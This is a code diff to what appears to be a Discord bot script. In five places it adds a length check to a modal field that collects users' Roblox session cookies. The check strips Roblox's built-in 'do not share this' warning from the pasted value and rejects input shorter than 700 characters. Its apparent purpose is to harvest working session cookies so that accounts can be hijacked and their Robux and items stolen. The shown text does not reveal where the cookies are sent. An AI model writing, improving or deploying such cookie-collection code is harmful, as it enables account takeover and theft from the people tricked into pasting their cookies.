@@ -108,6 +108,13 @@ Thanks!
 }
 ]
 
+$onlyif[$charCount[$replaceText[$textinputvalue[cookieinput];_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_;]]>=700;{
+    "embeds" : "{newEmbed:{description:Provide Your Cookie Correctly!}{color:ff0000}}",
+    "ephemeral" : true,
+    "options" : {
+        "interaction" : true
+    }
+}]
 
 $onlyif[$replaceText[$textinputvalue[cookieinput];_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_;]!=;{
     "embeds" : "{newEmbed:{description:Provide Your Cookie Correctly!}{color:ff0000}}",
@@ -197,6 +204,14 @@ Thanks!
 ]
 
 
+$onlyif[$charCount[$replaceText[$textinputvalue[cookieinput];_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_;]]>=700;{
+    "embeds" : "{newEmbed:{description:Provide Your Cookie Correctly!}{color:ff0000}}",
+    "ephemeral" : true,
+    "options" : {
+        "interaction" : true
+    }
+}]
+
 $onlyif[$replaceText[$textinputvalue[cookieinput];_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_;]!=;{
     "embeds" : "{newEmbed:{description:Provide Your Cookie Correctly!}{color:ff0000}}",
     "ephemeral" : true,
@@ -285,6 +300,14 @@ Thanks!
 ]
 
 
+$onlyif[$charCount[$replaceText[$textinputvalue[cookieinput];_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_;]]>=700;{
+    "embeds" : "{newEmbed:{description:Provide Your Cookie Correctly!}{color:ff0000}}",
+    "ephemeral" : true,
+    "options" : {
+        "interaction" : true
+    }
+}]
+
 $onlyif[$replaceText[$textinputvalue[cookieinput];_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_;]!=;{
     "embeds" : "{newEmbed:{description:Provide Your Cookie Correctly!}{color:ff0000}}",
     "ephemeral" : true,
@@ -371,6 +394,14 @@ Thanks!
 {button:50 $:primary:eperm:true}
 }
 ]
+
+$onlyif[$charCount[$replaceText[$textinputvalue[cookieinput];_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_;]]>=700;{
+    "embeds" : "{newEmbed:{description:Provide Your Cookie Correctly!}{color:ff0000}}",
+    "ephemeral" : true,
+    "options" : {
+        "interaction" : true
+    }
+}]
 
 $onlyif[$replaceText[$textinputvalue[cookieinput];_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_;]!=;{
     "embeds" : "{newEmbed:{description:Provide Your Cookie Correctly!}{color:ff0000}}",
@@ -459,6 +490,14 @@ Thanks!
 }
 ]
 
+
+$onlyif[$charCount[$replaceText[$textinputvalue[cookieinput];_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_;]]>=700;{
+    "embeds" : "{newEmbed:{description:Provide Your Cookie Correctly!}{color:ff0000}}",
+    "ephemeral" : true,
+    "options" : {
+        "interaction" : true
+    }
+}]
 
 $onlyif[$replaceText[$textinputvalue[cookieinput];_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_;]!=;{
     "embeds" : "{newEmbed:{description:Provide Your Cookie Correctly!}{color:ff0000}}",
